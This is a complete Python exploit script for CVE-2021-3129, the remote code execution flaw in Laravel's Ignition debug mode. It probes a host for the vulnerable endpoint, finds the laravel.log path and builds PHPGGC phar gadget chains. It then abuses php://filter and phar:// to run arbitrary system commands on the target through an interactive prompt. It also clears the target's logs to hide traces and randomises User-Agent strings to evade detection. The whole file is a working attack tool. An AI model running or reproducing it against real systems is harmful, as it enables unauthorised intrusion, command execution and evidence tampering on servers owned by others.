import argparse
import random
import sys

import requests
import os
import base64
import zipfile
import stat
import pkg_resources
import re
import subprocess
import readline
import shutil


PURPLE = '\033[95m'
CYAN = '\033[96m'
DARKCYAN = '\033[36m'
BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
END = '\033[0m'


CHAINS = ["laravel/rce1", "laravel/rce2", "laravel/rce3", "laravel/rce4",
            "laravel/rce7", "laravel/rce8", "monolog/rce1", "monolog/rce2", "monolog/rce3",
            "monolog/rce5", "monolog/rce6", "monolog/rce7"]

USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
    "Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
]


class Main:
    def __init__(self, host, force=False, log_path=None, useragent=False, chain=None, php_executable="php"):
        self.host = host
        self.force = force
        self.log_path = log_path
        self.useragent = self.random_useragent() if useragent else "Python"
        self.chain = chain
        self.php_executable = php_executable
        self.session = requests.session()

        self.start()

    def start(self):
        print(DARKCYAN + f"[@] Starting exploit on \"{self.host}\"...")

        # Check if vulnerable
        if not self.is_vulnerable():
            print(RED + "[!] Host does not seem to be vulnerable. Use parameter \"--force\" to bypass this check.")
            exit()

        # Ask user interaction
        print(PURPLE + "[â€¢] Use \"?\" for a list of all possible actions.")
        self.ask_command()

    def ask_command(self):
        response = input(f"{PURPLE}[?] Please enter a command to execute: {END}")
        response_list = response.split(" ",1)
        command = response_list[0].lower()
        if(len(response_list) == 2):
            payload = response_list[1]
        else:
            payload = "null"
        if command == "?" or command == "help":  # Return list of commands
            self.cmd_help()
        elif command == "exit":  # Stop script
            exit()
        elif command == "clear_logs":  # Attempt to clear laravel.log of target
            self.cmd_clear_logs()
        elif command == "execute":  # Attempt to execute system command on target
            self.cmd_execute_cmd(payload)
        elif command == "write":  # Attempt to write to the log file of target
            self.cmd_execute_write(payload)
        else:
            print(RED + f"[!] No command found named \"{command}\".")

        self.ask_command()

    def cmd_help(self):
        print(BLUE + "[â€¢] Available commands:")
        print(DARKCYAN + "    exit - Exit program.")
        print(DARKCYAN + "    help - Shows available commands.")
        print(DARKCYAN + "    clear_logs - Clears Laravel logs.")
        print(DARKCYAN + "    execute <command> - Execute system command.")
        print(DARKCYAN + "    write <text> - Write to log file.")

    def cmd_clear_logs(self):
        print(DARKCYAN + f"[@] Clearing Laravel logs...")
        self.exploit_clear_logs()
        if not self.force:
            print(GREEN + f"[âˆš] Cleared Laravel logs!")

    def cmd_execute_cmd(self, cmd):
        print(DARKCYAN + f"[@] Executing command \"{cmd}\"...")
        payloads = self.generate_payloads(cmd, 16)

        i = 0
        for payload in payloads:
            i = i+1
            print(f"{PURPLE}[@] Trying chain {payload['name']} [{i}/{len(payloads)}]...")

            self.exploit_execute(payload['data'])
            
            if i < len(payloads):
                next_chain = input(PURPLE + "[?] Do you want to try the next chain? [Y/N] : ")
                if next_chain.lower() == "y" or next_chain.lower() == "yes":
                    continue
                else:
                    break

    def cmd_execute_write(self, text):
        print(DARKCYAN + f"[@] Writing to log file: \"{text}\"...")
        payload = self.generate_write_payload(text, 16)

        print(BLUE + "[@] Clearing logs...")  # Step 1. Clear logs to prevent old payloads executing.
        self.exploit_clear_logs()

        print(BLUE + "[@] Causing error in logs...")  # Step 2. Cause a error to write phar file.
        if self.exploit_cause_error().status_code != 500:
            print(RED + "[!] Failed causing error.")
            exit(1)
        print(GREEN + "[âˆš] Caused error in logs.")

        print(BLUE + "[@] Sending payload...")  # Step 3. Cause error with payload so payload in log file.
        if self.exploit_request(payload, 500).status_code != 500:
            print(RED + "[!] Failed sending payload.")
            exit(1)
        print(GREEN + "[âˆš] Sent payload.")

        print(BLUE + "[@] Converting payload...")  # Step 4. Change te log file into the payload in the log file.
        if (self.exploit_request(
                f"php://filter/read=convert.quoted-printable-decode|"
                f"convert.iconv.utf-16le.utf-8|"
                f"convert.base64-decode/resource={self.log_path}",
                200).status_code != 200):
            print(RED + "[!] Failed converting payload.")
            exit(1)
        print(GREEN + "[âˆš] Converted payload.")

    def exploit_clear_logs(self) -> requests.Response:  # Clear entire log file
        return self.exploit_request(f"php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource={self.log_path}", 200, True)
        # return self.exploit_request(f"php://filter/read=consumed/resource={self.log_path}", 200)

    def exploit_cause_error(self) -> requests.Response:  # Cause error by sending path parameter
        return self.exploit_request("AA", 500)

    def exploit_execute(self, payload):
        success = True
        print(BLUE + "[@] Clearing logs...")  # Step 1. Clear logs to prevent old payloads executing.
        self.exploit_clear_logs()

        print(BLUE + "[@] Causing error in logs...")  # Step 2. Cause a error to write phar file.
        if self.exploit_cause_error().status_code != 500:
            print(RED + "[!] Failed causing error.")
            self.exploit_clear_logs()
            success = False
        else:
            print(GREEN + "[âˆš] Caused error in logs.")

        print(BLUE + "[@] Sending payloads...")

        if self.exploit_request(payload, 500).status_code != 500:  # Step 3. Cause error with payload so payload in log file.
            print(RED + "[!] Failed sending payload.")
            self.exploit_clear_logs()
            success = False
        else:
            print(GREEN + "[âˆš] Sent payload.")

        print(BLUE + "[@] Converting payload...")  # Step 4. Change te log file into the payload in the log file.
        if (self.exploit_request(
                f"php://filter/read=convert.quoted-printable-decode|"
                f"convert.iconv.utf-16le.utf-8|"
                f"convert.base64-decode/resource={self.log_path}",
                200).status_code != 200):
            print(RED + "[!] Failed converting payload.")
            self.exploit_clear_logs()
            success = False
        else:
            print(GREEN + "[âˆš] Converted payload.")

        exploited = self.exploit_request(f"phar://{self.log_path}", 500)  # Step 5. Let host execute phar script.
        if exploited.status_code == 500 and "cannot be empty" in exploited.text:
            print(GREEN + "[âˆš] Result:")
            result = exploited.text.split("</html>")[1]
            print(END + result)
        else:
            error_search = r"<title>ðŸ§¨ (.*?)<\/title>"
            error_result = re.search(error_search, exploited.text)
            if error_result:
                print(RED + f"[!] Failed execution of payload.\nError: \"{error_result[1]}\".")
                success = False
            else:
                print(RED + "[!] Failed execution of payload.")
                success = False
        
        self.exploit_clear_logs()
        self.exploit_clear_logs()

        return success

    def random_useragent(self) -> str:  # Get random user agent from constant list
        return random.choice(USER_AGENTS)

    def setup_phpggc(self):
        zip_path = "./master_phpggc.zip"
        print(BLUE + "[@] Downloading PHPGGC from \"ambionics/phpggc\" GitHub repository...")

        # Download repository zip
        request = self.session.get("https://github.com/ambionics/phpggc/archive/refs/heads/master.zip",
                               verify=False, allow_redirects=True, headers={"User-Agent": self.useragent})
        open(zip_path, "wb").write(request.content)

        # Unzip zip
        with zipfile.ZipFile(zip_path, "r") as zip_ref:
            zip_ref.extractall("./")
        print(GREEN + "[âˆš] Downloaded/extracted PHPGGC.")

        phpggc_path = "./phpggc-master/phpggc"

        # Setup phpggc execute permissions
        print(BLUE + "[@] Updating PHPGGC execution permissions...")
        if os.path.exists(phpggc_path):
            st = os.stat(phpggc_path)
            os.chmod(phpggc_path, st.st_mode | stat.S_IEXEC)
        print(GREEN + "[âˆš] Updated PHPGGC execution permissions.")

        # Remove extracted zip file
        os.unlink(zip_path)

    def generate_payloads(self, command: str, padding=0) -> list:
        payloads = []
        print(DARKCYAN + f"[@] Generating payloads...")

        # Prepare command
        if '/' in command:
            command = command.replace('/', '\/')
            command = command.replace('\'', '\\\'')

        if '\'' in command:
            command = command.replace("'", "\'")

        try:
            subprocess.run([self.php_executable, "-v"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except FileNotFoundError:
            print(RED + "[!] PHP does not seem to be installed. Please use the \"--php\" variable to define your PHP path.")
            exit(1)

        # Check PHPGGC
        if not os.path.exists("./phpggc-master/phpggc"):
            print(RED + "[!] Required binary PHPGGC not found.")
            self.setup_phpggc()

        # Build payload
        if os.path.exists("./.tmp"):
            shutil.rmtree("./.tmp")
        os.mkdir("./.tmp")

        chains = CHAINS if self.chain == None else [self.chain]
        for chain in chains:
            phar_name = chain.replace("/", "-") + ".phar"
            phar_path = f"./.tmp/{phar_name}"

            os.system(f"{self.php_executable} -d'phar.readonly=0' ./phpggc-master/phpggc {chain} system '{command}' --phar phar -o {phar_path}")

            if os.path.exists(phar_path):
                payload = open(phar_path, 'rb').read()
                payload = base64.b64encode(payload).decode().rstrip('=')
                payload = ''.join(c + '=00' for c in payload)
                payload = 'A' * padding + payload
                payload = payload.replace("\n", "") + "A"

                payloads.append({"data": payload, "name": chain})

                # Delete temporary files
                os.unlink(phar_path)

        print(GREEN + f"[âˆš] Generated {len(payloads)} payloads.")
        return payloads

    def generate_write_payload(self, text: str, padding=0) -> str:
        print(DARKCYAN + f"[@] Generating payload...")

        # Prepare/encode payload
        payload = base64.b64encode(text.encode()).decode().rstrip('=')
        payload = ''.join(c + '=00' for c in payload)
        payload = 'A' * padding + payload

        print(GREEN + f"[âˆš] Generated payload.")
        return payload

    def exploit_request(self, value: str, expected_response: int = 200, silent=False) -> requests.Response:
        data = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "variable",
                "viewFile": value
            }
        }
        headers = {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "User-Agent": self.useragent
        }

        request = self.session.post(url=f"{self.host}_ignition/execute-solution", json=data, headers=headers, verify=False)
        if request.status_code != expected_response and not silent:
            error_search = r"<title>ðŸ§¨ (.*?)<\/title>"
            error_result = re.search(error_search, request.text)
            if error_result:
                print(RED + f"[!] Exploit request returned status code {request.status_code}. Expected {expected_response}.\nError: \"{error_result[1]}\"")
            else:
                print(RED + f"[!] Exploit request returned status code {request.status_code}. Expected {expected_response}.")

        # Check if host has patched vulnerability
        if "runnable solutions are disabled in non-local environments" in request.text.lower():
            print(RED + f"[!] Website has patched the vulnerability. "
                        f"Response: \"Runnable solutions are disabled in non-local environments.\"")

        if "solutions can only be executed by requests from a local ip address" in request.text.lower():
            print(RED + f"[!] Website has patched the vulnerability. "
                        f"Response: \"Solutions can only be executed by requests from a local IP address.\"")

        return request

    def is_vulnerable(self):
        print(DARKCYAN + f"[@] Testing vulnerable URL {self.host}_ignition/execute-solution...")
        request = self.session.get(url=f"{self.host}_ignition/execute-solution", verify=False, headers={"User-Agent": self.useragent})

        # Check vulnerable url by sending invalid GET request (only POST allowed)
        if request.status_code != 405:
            print(BLUE + f"[â€¢] Host returned status code {request.status_code}. Expected 405 (Method not allowed).")
            if not self.force: return False

        # Check if vulnerable url contains signs of Laravel
        if "laravel" not in str(request.content):
            if "405 method not allowed" in str(request.content).lower():
                print(RED + f"[â€¢] Host refused request method.")
            else:
                print(RED + f"[â€¢] Host does not seems like Laravel. No \"laravel\" found in body.")
            if not self.force: return False

        if not self.force: print(GREEN + f"[âˆš] Host seems vulnerable!")

        # Check if log path defined in error response
        print(DARKCYAN + f"[@] Searching Laravel log file path...")
        found_path = self.find_log_path(content=request.content)

        if self.log_path is None:
            if found_path is None:
                print(RED + "[!] No log path could be found. Please define the log path with the \"--log\" argument")
                exit()
            else:
                print(BLUE + f"[âˆš] Laravel log found: \"{DARKCYAN}{found_path}{BLUE}\".")

        # Check if laravel version defined in error response
        laravel_version = self.find_laravel_version(content=request.text)
        if laravel_version is not None:
            print(BLUE + f"[â€¢] Laravel version found: \"{DARKCYAN}{laravel_version}{BLUE}\".")

            if not self.force:
                patched_version = pkg_resources.parse_version("8.4.2")
                current_version = pkg_resources.parse_version(laravel_version)
                if current_version >= patched_version:
                    print(RED + "[!] Host is using a patched version of Laravel. "
                                "Use parameter \"--force\" to bypass this check.")
                    exit()

        if self.log_path is None:
            self.log_path = found_path
        else:
            print(BLUE + f"[â€¢] Ignoring found path. Using path \"{DARKCYAN}{self.log_path}{BLUE}\".")

        return True

    def find_log_path(self, content):
        log_path = None

        # Regex search for file path
        search_pattern = r"The .* supported .* in file (.*?) on line"
        search_res = re.search(search_pattern, str(content))

        if search_res:
            file_path = search_res[1]

            if "/vendor/laravel/framework" in file_path: # Linux system
                print(BLUE + f"[â€¢] Laravel seems to be running on a {DARKCYAN}Linux{BLUE} based machine.")
                root_path = file_path.split("/vendor/laravel/framework")[0]
                log_path = f"{root_path}/storage/logs/laravel.log"
            if "\\\\vendor\\\\laravel\\\\framework" in file_path: # Windows system
                print(BLUE + f"[â€¢] Laravel seems to be running on a {DARKCYAN}Windows{BLUE} based machine.")
                root_path = file_path.split("\\\\vendor\\\\laravel\\\\framework")[0].replace("\\\\", "\\")
                log_path = f"{root_path}\\storage\\logs\\laravel.log"

        return log_path

    def find_laravel_version(self, content: str):

        # Regex search for framework version
        search_pattern = r"\"framework_version\":\"(.*?)\""
        search_res = re.search(search_pattern, content)

        if search_res:
            return search_res[1]
        return None


def validate_url(url: str) -> bool:  # https://stackoverflow.com/a/7160778
    regex = re.compile(
        r'^(?:http)s?://'  # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)

    return re.match(regex, url) is not None


if __name__ == "__main__":

    # Credits
    print(PURPLE + BOLD + "Laravel Debug Mode CVE script")
    print(END + PURPLE + "[â€¢] Made by: https://github.com/joshuavanderpoll/CVE-2021-3129" + RED)
    print(END + PURPLE + "[â€¢] Using PHPGGC: https://github.com/ambionics/phpggc" + RED)

    # Arguments
    parser = argparse.ArgumentParser(description='Exploit CVE-2021-3129 - Laravel vulnerability exploit script')
    parser.add_argument('--host', help='Host URL to use exploit on', required=False)
    parser.add_argument('--force', help='Force exploit without checking if vulnerable', required=False, default=False,
                        action='store_true')
    parser.add_argument('--log', help='Full path to laravel.log file (e.g. /var/www/html/storage/logs/laravel.log)',
                        required=False, default=None)
    parser.add_argument('--ua', help='Randomize User-Agent for requests', required=False, default=False,
                        action='store_true')
    parser.add_argument('--chain', help=f"Select PHPGGC chain. Use \"--chains\" parameter to view all available chains.",
                        required=False, default=None)
    parser.add_argument('--chains', help='View available chains for the \"--chain\" parameter', required=False,
                        default=False, action='store_true')
    parser.add_argument('--php', help='Path to PHP executable', required=False, default="php")

    args = parser.parse_args()

    # Chains
    if args.chains:
        print(
            f"{RED}[â€¢] Available chains (Updated: 19 April 2022):\n"
            f"{YELLOW}- Laravel/RCE1 (5.4.27)\n"
            f"{YELLOW}- Laravel/RCE2 (5.4.0 <= 8.6.9+)\n"
            f"{YELLOW}- Laravel/RCE3 (5.5.0 <= 5.8.35)\n"
            f"{YELLOW}- Laravel/RCE4 (5.4.0 <= 8.6.9+)\n"
            f"{YELLOW}- Laravel/RCE5 (5.8.30)\n"
            f"{YELLOW}- Laravel/RCE6 (5.5.* <= 5.8.35)\n"
            f"{YELLOW}- Laravel/RCE7 (? <= 8.16.1)\n"
            f"{YELLOW}- Laravel/RCE8 (7.0.0 <= 8.6.9+)\n"
            f"\n"
            f"{YELLOW}- Monolog/RCE1 (1.4.1 <= 1.6.0 1.17.2 <= 2.2.0+)\n"
            f"{YELLOW}- Monolog/RCE2 (1.4.1 <= 2.2.0+)\n"
            f"{YELLOW}- Monolog/RCE3 (1.1.0 <= 1.10.0)\n"
            f"{YELLOW}- Monolog/RCE4 (? <= 2.4.4+)\n"
            f"{YELLOW}- Monolog/RCE5 (1.25 <= 2.2.0+)\n"
            f"{YELLOW}- Monolog/RCE6 (1.10.0 <= 2.2.0+)\n"
            f"{YELLOW}- Monolog/RCE7 (1.10.0 <= 2.2.0+)\n"
            f"{RED}from: https://github.com/ambionics/phpggc#usage"
        )
        exit()

    # Validate before scan start
    if args.host is None:
        args.host = input(f"{BLUE}[?] Enter host (e.g. https://example.com/){DARKCYAN} : ")

    if args.host[-1] != "/": args.host = args.host + "/"

    if args.host[0:7] != "http://" and args.host[0:8] != "https://":
        args.host = f"http://{args.host}"
 
    if not validate_url(args.host):
        print(RED + "[!] Parameter \"--host\" is invalid. Please use a valid url (e.g. https://example.com/)")
        exit()

    if args.chain != None and args.chain.lower() not in CHAINS:
        print(RED + f"[!] Parameter \"--chain\" is invalid. Please check \"{sys.executable} {os.path.basename(__file__)} --chains\".")
        exit()

    requests.packages.urllib3.disable_warnings()
    x = Main(host=args.host, force=args.force, log_path=args.log, useragent=args.ua, chain=args.chain, php_executable=args.php)
